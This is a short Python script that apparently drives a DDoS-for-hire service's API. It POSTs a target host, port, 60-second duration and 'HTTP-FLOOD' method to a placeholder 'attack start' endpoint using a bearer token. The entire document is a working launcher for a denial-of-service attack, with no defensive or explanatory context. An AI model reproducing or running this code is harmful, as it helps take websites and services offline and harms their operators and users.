import requests

url = "YOUR_ATTACK_START_ENDPOINT"
headers = {
    "Authorization": "Bearer YOUR_API_TOKEN"
}
data = {
    "host": "example.com",
    "port": 80,
    "time": 60,
    "method": "HTTP-FLOOD"
}

response = requests.post(url, headers=headers, data=data)
print(response.json())
